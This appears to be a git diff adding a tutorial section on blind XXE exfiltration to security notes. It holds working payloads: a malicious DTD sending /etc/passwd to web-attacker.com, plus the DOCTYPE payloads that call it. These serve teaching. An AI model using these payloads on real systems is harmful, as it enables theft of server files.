@@ -57,7 +57,8 @@ You would then make use of the defined entity in a data value within the XML.
 
 This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.
 Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. 
-#### XML Parameter Entity
+
+### XML Parameter Entity
 In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
 ```
 <!ENTITY % myparameterentity "my parameter entity value" >
@@ -71,5 +72,38 @@ This means that you can test for blind XXE using out-of-band detection via XML p
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 ```
 This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.
+
+## Exploiting blind XXE to exfiltrate data out-of-band
+Exploiting blind XXE to exfiltrate data involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
+
+An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+This DTD carries out the following steps:
+
+- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
+- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
+- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
+- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
+
+The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
+
+`http://web-attacker.com/malicious.dtd`
+
+Finally, the attacker must submit the following XXE payload to the vulnerable application:
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
+```
+This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.
+
+> [!NOTE]
+> This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.
 
 ## Exploiting blind XXE to retrieve data via error messages
